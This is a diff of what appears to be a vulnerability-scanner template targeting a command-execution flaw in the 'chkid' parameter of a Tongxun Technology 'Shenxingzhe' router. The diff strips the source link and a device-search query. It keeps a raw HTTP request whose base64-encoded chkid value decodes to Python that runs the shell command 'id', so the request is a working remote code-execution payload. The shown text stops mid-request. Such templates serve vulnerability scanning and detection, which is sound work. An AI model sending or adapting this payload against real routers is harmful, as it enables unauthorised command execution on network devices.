@@ -3,12 +3,8 @@ info:
   name: 同迅科技-神行者路由chkid存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zrvxr57q4k190zfx'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zrvxr57q4k190zfx
-    fofa: app="同迅科技-神行者路由"
 http:
 - raw:
   - 'GET /?title=ABC&oIp=XXX&chkid=X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIikgb3IgX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKSAjc1VzZXJDb2RleHNQd2Q= HTTP/1.1
